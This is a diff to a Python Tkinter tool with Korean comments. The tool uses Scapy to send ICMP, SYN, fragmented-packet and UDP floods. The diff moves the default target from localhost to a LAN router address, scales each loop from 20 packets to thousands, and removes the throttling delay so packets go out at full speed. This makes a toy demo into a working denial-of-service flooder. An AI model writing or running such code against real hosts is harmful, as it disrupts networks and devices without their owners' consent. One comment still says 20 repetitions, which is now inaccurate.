@@ -17,7 +17,7 @@ label1.pack(pady=5)
 # 주소를 입력받는 하얀 칸 만들기
 ip_input = tk.Entry(window, width=20, font=("Segoe UI", 12))
 ip_input.pack(pady=5)
-ip_input.insert(0, "127.0.0.1") # 기본으로 내 컴퓨터 주소를 적어뒀어요.
+ip_input.insert(0, "192.168.0.1") # 기본으로 내 컴퓨터 주소를 적어뒀어요.
 ip_input.pack(pady=14)
 
 # 무슨 일이 일어나는지 보여주는 노란색 글자창
@@ -41,9 +41,11 @@ def icmp_attack():
     # IP()는 편지 봉투고, ICMP()는 "안녕?"이라는 편지 내용이에요.
     packet = IP(dst=target) / ICMP()
 
-    for i in range(20): # 20번 반복해서 보내볼게요.
+    for i in range(5000): # 20번 반복해서 보내볼게요.
         send(packet, verbose=False) # 편지 보내기 (verbose=False는 조용히 보내라는 뜻!)
-        write_log(f"{i+1}번째 핑 완료")
+        if i % 1000 == 0:
+            write_log(f"전송 중... ({i}/5000)")
+            window.update() # GUI가 멈추지 않게 살짝 갱신
     # 반복문(for)이 다 끝나고 나서 실행돼요!
     write_log(">>> ICMP 공격 완료!!")
 
@@ -56,9 +58,12 @@ def syn_attack():
     # dport=80은 보통 인터넷 홈페이지가 사용하는 문(포트)이에요.
     packet = IP(dst=target) / TCP(dport=80, flags="S")
 
-    for i in range(20):
+    for i in range(2000):
         send(packet, verbose=False)
-        write_log(f"{i+1}번째 연결 요청 완료")
+        if i % 200 == 0:
+            write_log(f"연결 요청 중... ({i}/2000)")
+            # GUI가 멈추지 않도록 화면을 강제 갱신합니다.
+            window.update()
     write_log(">>> SYN 공격 완료!!")
 
 # # [기능 3] 내 주소 속이기 (IP 스푸핑)
@@ -92,10 +97,17 @@ def frag_attack():
     # fragment라는 도구를 쓰면 큰 편지를 작은 조각(600바이트씩)으로 잘라줘요.
     small_pieces = fragment(packet, fragsize=600)
 
-    for p in small_pieces:
-        send(p, verbose=False)
-        write_log("작은 조각 하나 보냄...")
-        time.sleep(0.1) # 너무 빠르면 안 되니까 0.1초씩 쉬어줘요.
+    for i in range(500):
+        for p in small_pieces:
+            send(p, verbose=False)
+
+        # 4. [중요] time.sleep(0.1)을 삭제하여 전송 속도를 극대화합니다.
+
+        # 5. 50세트마다 한 번씩만 화면을 갱신합니다.
+        if i % 50 == 0:
+            write_log(f"조각 패킷 세트 전송 중... ({i}/500)")
+            window.update()
+
     write_log(">>> 패킷 쪼개기 공격 완료!!")
 
 # [기능 5] UDP 쓰레기 던지기
@@ -103,14 +115,17 @@ def udp_attack():
     target = ip_input.get()
     write_log("UDP 쓰레기 데이터 던지기 시작!")
 
-    for i in range(20):
+    for i in range(2000):
         # 1000번부터 2000번 사이의 아무 문(포트)으로나 던져요.
         random_port = random.randint(1000, 2000)
         # 내용물은 그냥 "쓰레기 데이터"라고 적은 편지예요.
         packet = IP(dst=target) / UDP(dport=random_port) / "쓰레기 데이터"
         send(packet, verbose=False)
-        write_log(f"{random_port}번 포트로 툭 던짐")
-    write_log(">>> UDP 던지기 완료!!")
+        if i % 200 == 0:
+            write_log(f"쓰레기 데이터 던지는 중... ({i}/2000)")
+            window.update() # GUI 멈춤 방지
+    write_log(">>> UDP 공격 완료!!")
+
 # ==========================================
 # 3. 버튼 만들기 (누르면 위 기능들이 실행돼요)
 # ==========================================
